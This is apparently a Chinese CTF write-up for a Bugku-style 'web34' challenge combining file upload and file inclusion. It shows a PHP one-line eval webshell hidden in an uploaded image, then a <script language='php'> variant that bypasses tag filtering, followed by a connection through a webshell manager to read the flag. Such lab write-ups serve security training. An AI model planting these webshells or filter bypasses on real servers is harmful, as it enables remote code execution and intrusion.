# web34
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661256468-3359652229290.png)
题目描述
文件包含
进入题目
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661275097-4844353225845.png)
有?file=hello.php的字样
再打开源码
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661298785-712855221599.png)
有个upload.php的字样
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661319201-1270656239479.png)
文件上传
还有文件包含
这题估计是让上传一个图片马
然后用文件包含去执行这个图片马反弹shell
 ![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661337491-1390558237083.png)
先上传一个图片再抓包然后在图片的结尾中加入一个一句话木马
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661357417-299122225826.png)

```php
<?php @eval($_POST['shell']);?>
```
上传成功
去执行一下看看是否能执行
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661373714-662223248266.png)
去文件包含里执行了文件
发现并没有执行
反而是吧<?php?>标签给替换成了_
emmmm
这就需要尝试另一种方法去注入码了

----

想起以前在buu做个的一道题，和这道题类似

php和javascript都是脚本语言
而且javascript是可以指定外部的脚本的
```javascript
<script language='php'>echo 'hello';</script>;
```
```php
include('test.js')
```
上面的执行结果就是
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661390469-5571640243402.png)

上传一个js的外部指定木马

```javascript
<script language='php'>echo 'hello'; @eval($_POST['shell'])</script>
```
>echo的含义是验证是否执行了php代码

上传木马
![img](D:\ebook\markdown\image/bugku/1518944236948.png)
查看是否成功
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661421003-5102844230082.png)
返回hell
执行成功
:D~~
用蚁剑连接
![img](D:\ebook\markdown\image/bugku/4354046220612.png)
连接成功在
根目录下找到flag
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618661448532-3413847223116.png)